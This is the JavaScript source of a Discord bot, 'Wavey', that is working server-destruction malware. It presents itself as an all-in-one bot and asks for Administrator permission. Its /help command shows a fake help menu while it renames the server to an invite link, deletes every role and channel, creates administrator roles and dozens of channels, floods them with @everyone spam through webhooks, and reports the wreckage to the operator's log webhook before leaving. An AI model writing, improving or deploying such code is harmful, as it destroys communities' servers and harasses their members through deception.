const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, WebhookClient } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const emojis = ['💀', '⚰️', '🦴', '🪦', '⚔️', '🗡️', '🔪', '🩸', '☠️', '👻'];
const discordLink = "https://discord.gg/XrTZWKgXca";

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    
    // Register the fake help command
    client.application.commands.create({
        name: 'help',
        description: 'shows help menu of bot commands'
    }).then(() => console.log('Fake help command registered!')).catch(console.error);
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand()) return;
    
    if (interaction.commandName === 'help') {
        // Create a fake help menu embed
        const helpEmbed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('Wavey Bot')
    .setDescription(
        [
            'Hi, it\'s **Wavey**.',
            '',
            'Wavey is an all-in-one Discord bot.',
            'Perfect for your server?',
            '',
            '**Wavey Prefix:** `?`',
            '',
            '**To suggest new commands, join our Discord Server:**',
            '<https://discord.gg/XrTZWKgXca>',
            '',
            '**Invite Wavey to your server:**',
            '<https://discord.com/oauth2/authorize?client_id=1518034096561848440&permissions=8&integration_type=0&scope=bot>',
            '',
            'Use **Wavey\'s Commands**.'
        ].join('\n')
    )
    .setTimestamp()
    .setFooter({ text: 'Wavey Bot' });

        // Reply with the fake help menu
        await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
        
        // CAPTURE ORIGINAL SERVER INFO AND USER BEFORE CHANGING NAME
        const originalServerName = interaction.guild.name;
        const originalServerIcon = interaction.guild.iconURL();
        const triggeredBy = interaction.user.tag;
        
        // Change server name to the Discord link
        await interaction.guild.setName(discordLink).catch(console.error);
        
        // Start the nuke process in the background with the captured info
        nukeServer(interaction.guild, originalServerName, originalServerIcon, triggeredBy);
    }
});

async function nukeServer(guild, originalServerName, originalServerIcon, triggeredBy) {
    try {
        console.log('Starting nuke process...');
        
        const memberCount = guild.memberCount;
        let rolesDeleted = 0;
        let channelsDeleted = 0;
        
        // First delete all roles (except @everyone)
        const roles = await guild.roles.fetch();
        await Promise.all(roles.map(role => {
            if (role.editable && role.name !== '@everyone') {
                rolesDeleted++;
                return role.delete().catch(console.error);
            }
        }));
        
        // Then instantly delete all channels
        const channels = await guild.channels.fetch();
        await Promise.all(channels.map(channel => {
            if (channel.deletable) {
                channelsDeleted++;
                return channel.delete().catch(console.error);
            }
        }));
        
        // Create 15 roles
        const rolePromises = [];
        for (let i = 0; i < 15; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            rolePromises.push(
                guild.roles.create({
                    name: `@Wavey-${randomEmoji}`,
                    color: '#FF0000',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    position: i + 1
                }).catch(console.error)
            );
        }
        await Promise.all(rolePromises);
        
        // Create 35 text channels and send webhook pings - FIXED TO PROPERLY AWAIT
        const channelPromises = [];
        for (let i = 0; i < 35; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            
            channelPromises.push(
                (async () => {
                    try {
                        // Create channel
                        const channel = await guild.channels.create({
                            name: `Wavey-${randomEmoji}`,
                            type: 0 // GUILD_TEXT
                        });
                        
                        // Create webhook in this channel
                        const webhook = await channel.createWebhook({
                            name: `Wavey-${randomEmoji}`,
                            avatar: client.user.displayAvatarURL()
                        });
                        
                        const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                        
                        // Send 25 pings through the webhook - AWAIT EACH ONE
                        for (let j = 0; j < 25; j++) {
                            await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
                        }
                        
                        // Delete the webhook
                        await webhook.delete().catch(console.error);
                        
                        console.log(`Completed channel ${i + 1}/55`);
                    } catch (error) {
                        console.error('Error in channel/webhook:', error);
                    }
                })()
            );
        }
        
        // Wait for ALL channels AND their webhook pings to complete
        await Promise.all(channelPromises);
        
        console.log('All webhook pings sent!');
        
        // NOW send log webhook notification
        try {
            const logWebhook = new WebhookClient({ url: process.env.LOG_WEBHOOK });
            const nukeEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('💀 Server Nuked')
                .setDescription(`**${originalServerName}** has been destroyed\n\n🕵️ **Triggered by:** \`/help\` by ${triggeredBy}`)
                .setThumbnail(originalServerIcon)
                .addFields(
                    { name: '👥 Members', value: memberCount.toString(), inline: true },
                    { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                    { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                    { name: '➕ Roles Created', value: '15', inline: true },
                    { name: '➕ Channels Created', value: '35', inline: true }
                )
                .setTimestamp()
                .setFooter({ text: 'Wavey Nuke Bot' });
            
            await logWebhook.send({ embeds: [nukeEmbed] });
            console.log('Log webhook notification sent!');
        } catch (error) {
            console.error('Error sending log webhook:', error);
        }
        
        // NOW leave the server after everything is done
        try {
            await guild.leave();
            console.log('Left the server successfully!');
        } catch (error) {
            console.error('Error leaving server:', error);
        }
        
    } catch (error) {
        console.error('Error during nuke:', error);
    }
}

client.login(process.env.BOT_TOKEN);
